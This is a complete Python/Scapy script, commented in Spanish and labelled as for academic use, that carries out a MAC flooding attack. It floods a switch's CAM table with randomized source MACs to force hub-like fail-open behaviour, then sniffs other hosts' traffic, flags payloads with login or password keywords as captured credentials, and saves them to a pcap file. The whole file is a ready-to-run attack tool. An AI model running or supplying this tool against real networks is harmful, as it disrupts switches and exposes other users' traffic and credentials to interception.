#!/usr/bin/env python3
# ══════════════════════════════════════════════════════
#  MAC Flooding Attack - Fines Academicos
#  Scapy version: 2.5.0
# ══════════════════════════════════════════════════════

from scapy.all import *
import random
import os
import sys
import signal
import threading
import time
import argparse  # Nuevo: para argumentos de linea de comandos

# ─────────────────────────────────────────
#  CONFIGURACION POR DEFECTO
# ─────────────────────────────────────────
PACKET_DELAY   = 0.0001       # 0.1ms → ~10000 pkt/s
BURST_SIZE     = 100          # Paquetes por rafaga
BURST_DELAY    = 0.01         # Delay entre rafagas
CAM_TABLE_SIZE = 8192         # Tamaño tipico tabla CAM Cisco (~8k entradas)

# ─────────────────────────────────────────
#  ESTADO GLOBAL
# ─────────────────────────────────────────
counter = {
    "sent"     : 0,
    "unique_mac": 0,
}
used_macs  = set()
stop_flag  = False
start_time = None
INTERFACE  = None  # Se define por argumento

# ─────────────────────────────────────────
#  HELPERS
# ─────────────────────────────────────────
def log(msg_type, msg):
    colors = {
        "INFO" : "\033[94m",
        "OK"   : "\033[92m",
        "WARN" : "\033[93m",
        "ERR"  : "\033[91m",
        "PKT"  : "\033[96m",
        "STAR" : "\033[95m",
    }
    reset = "\033[0m"
    ts    = time.strftime("%H:%M:%S")
    color = colors.get(msg_type, "")
    print(f"[{ts}] {color}[{msg_type}]{reset} {msg}")

def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(
        random.randint(0x00, 0xFF) for _ in range(5)
    )

def random_ip():
    return "%d.%d.%d.%d" % tuple(
        random.randint(1, 254) for _ in range(4)
    )

def cam_fill_percentage():
    return min((len(used_macs) / CAM_TABLE_SIZE) * 100, 100)

# ─────────────────────────────────────────
#  CONSTRUCCION DE PAQUETES
# ─────────────────────────────────────────
def build_flood_frame(src_mac, dst_mac=None):
    if dst_mac is None:
        dst_mac = random_mac()

    mode = random.randint(0, 2)

    if mode == 0:
        frame = (
            Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
            ARP(
                op=1,
                hwsrc=src_mac,
                psrc=random_ip(),
                pdst=random_ip()
            )
        )
    elif mode == 1:
        frame = (
            Ether(src=src_mac, dst=dst_mac) /
            IP(src=random_ip(), dst=random_ip()) /
            UDP(
                sport=random.randint(1024, 65535),
                dport=random.randint(1, 1023)
            ) /
            Raw(load=os.urandom(random.randint(10, 50)))
        )
    else:
        frame = (
            Ether(src=src_mac, dst=dst_mac) /
            Raw(load=os.urandom(random.randint(20, 60)))
        )

    return frame

# ─────────────────────────────────────────
#  SNIFFING POST-FLOOD (modo hub)
# ─────────────────────────────────────────
captured_packets = []
sniff_active     = False

def packet_sniffer(packet):
    global INTERFACE
    
    if not sniff_active:
        return

    our_mac = get_if_hwaddr(INTERFACE)
    if packet.haslayer(Ether):
        if packet[Ether].src == our_mac:
            return
        if packet[Ether].src.startswith("02:"):
            return

    if packet.haslayer(IP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        proto  = "TCP"  if packet.haslayer(TCP)  else \
                 "UDP"  if packet.haslayer(UDP)  else \
                 "ICMP" if packet.haslayer(ICMP) else "IP"

        info = ""
        if packet.haslayer(TCP):
            info = f":{packet[TCP].sport} → :{packet[TCP].dport}"
            if packet.haslayer(Raw):
                try:
                    payload = packet[Raw].load.decode("utf-8", errors="ignore")
                    if any(k in payload.upper() for k in
                           ["PASSWORD", "PASS", "USER", "LOGIN", "AUTH"]):
                        log("STAR", f"CREDENCIAL DETECTADA: {payload[:150]}")
                except:
                    pass
        elif packet.haslayer(UDP):
            info = f":{packet[UDP].sport} → :{packet[UDP].dport}"

        captured_packets.append(packet)
        log("PKT", f"[CAPTURADO] {proto} {src_ip}{info} → {dst_ip}")

def start_sniffer():
    global INTERFACE
    
    sniff(
        iface       = INTERFACE,
        prn         = packet_sniffer,
        store       = False,
        stop_filter = lambda p: stop_flag
    )

# ─────────────────────────────────────────
#  LOOP PRINCIPAL DE FLOOD
# ─────────────────────────────────────────
def flood_loop():
    global sniff_active

    log("INFO", f"Tabla CAM objetivo: ~{CAM_TABLE_SIZE} entradas")
    log("INFO", f"Rate estimado: {int(BURST_SIZE/BURST_DELAY)} pkt/s\n")

    phase = 1

    while not stop_flag:
        batch = []

        for _ in range(BURST_SIZE):
            if stop_flag:
                break

            src_mac = random_mac()
            used_macs.add(src_mac)
            frame = build_flood_frame(src_mac)
            batch.append(frame)
            counter["sent"] += 1

        sendp(batch, iface=INTERFACE, verbose=False)
        counter["unique_mac"] = len(used_macs)

        fill = cam_fill_percentage()

        if phase == 1 and fill >= 100:
            phase = 2
            sniff_active = True
            log("STAR", "="*55)
            log("STAR", "TABLA CAM PROBABLEMENTE SATURADA!")
            log("STAR", "Switch deberia estar en modo FAIL-OPEN (hub)")
            log("STAR", "Capturando trafico de otros hosts...")
            log("STAR", "="*55)

        time.sleep(BURST_DELAY)

# ─────────────────────────────────────────
#  MONITOR DE ESTADISTICAS
# ─────────────────────────────────────────
def stats_monitor():
    while not stop_flag:
        time.sleep(5)

        elapsed  = time.time() - start_time
        rate     = counter["sent"] / elapsed if elapsed > 0 else 0
        fill     = cam_fill_percentage()
        progress = min(int(fill / 5), 20)

        print(f"""
{'═'*60}
  MAC FLOODING - ESTADÍSTICAS
{'─'*60}
  Tiempo activo  : {int(elapsed)}s
  Frames enviados: {counter['sent']:,}
  MACs unicas    : {len(used_macs):,}
  Rate actual    : {rate:,.0f} pkt/s
  CAM fill est.  : {fill:.1f}% ({len(used_macs):,}/{CAM_TABLE_SIZE:,})
  Pkts capturados: {len(captured_packets)}
{'─'*60}
  PROGRESO CAM: [{'█' * progress:<20}] {fill:.1f}%
  {'⚠ SWITCH EN MODO HUB - CAPTURANDO TRAFICO' if fill >= 100 else '→ Llenando tabla CAM...'}
{'═'*60}
        """)

# ─────────────────────────────────────────
#  FUNCION PRINCIPAL
# ─────────────────────────────────────────
def mac_flood(iface):
    global stop_flag, start_time, INTERFACE
    
    INTERFACE = iface  # Guardar interfaz global
    stop_flag = False
    start_time = time.time()

    attacker_mac = get_if_hwaddr(INTERFACE)

    print(f"""
╔══════════════════════════════════════════════════════════╗
║         MAC Flooding Attack - Laboratorio                ║
╠══════════════════════════════════════════════════════════╣
║  Interfaz      : {INTERFACE:<39}║
║  MAC real      : {attacker_mac:<39}║
║  CAM size est. : {str(CAM_TABLE_SIZE)+' entradas':<39}║
║  Rate objetivo : {str(int(BURST_SIZE/BURST_DELAY))+' pkt/s':<39}║
╠══════════════════════════════════════════════════════════╣
║  FASE 1 → Llenar tabla CAM con MACs falsas               ║
║  FASE 2 → Switch modo hub → capturar trafico             ║
╚══════════════════════════════════════════════════════════╝
    """)

    def cleanup(sig=None, frame=None):
        global stop_flag
        stop_flag = True
        elapsed = time.time() - start_time
        print(f"\n\n[!] MAC Flooding detenido.")
        print(f"[+] Frames enviados    : {counter['sent']:,}")
        print(f"[+] MACs unicas usadas : {len(used_macs):,}")
        print(f"[+] Tiempo total       : {elapsed:.1f}s")
        print(f"[+] Rate promedio      : {counter['sent']/elapsed:,.0f} pkt/s")
        print(f"[+] Pkts capturados    : {len(captured_packets)}")

        if captured_packets:
            pcap_file = "/tmp/mac_flood_capture.pcap"
            wrpcap(pcap_file, captured_packets)
            log("OK", f"Capturas guardadas en: {pcap_file}")

        sys.exit(0)

    signal.signal(signal.SIGINT,  cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    log("INFO", "Iniciando sniffer (activo cuando CAM este llena)...")
    threading.Thread(target=start_sniffer, daemon=True).start()

    threading.Thread(target=stats_monitor, daemon=True).start()

    log("WARN", "Iniciando MAC Flooding... (Ctrl+C para detener)\n")
    flood_loop()

# ─────────────────────────────────────────
#  ENTRY POINT
# ─────────────────────────────────────────
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='MAC Flooding Attack - Scapy 2.5.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  sudo python3 mac_flood.py -i eth0
  sudo python3 mac_flood.py -i wlan0
        """
    )
    
    parser.add_argument(
        '-i', '--interface',
        required=True,
        help='Interfaz de red (ej: eth0, wlan0)'
    )
    
    args = parser.parse_args()

    if os.getuid() != 0:
        print("[!] Ejecutar como root: sudo python3 mac_flood.py -i <interfaz>")
        sys.exit(1)

    mac_flood(args.interface)
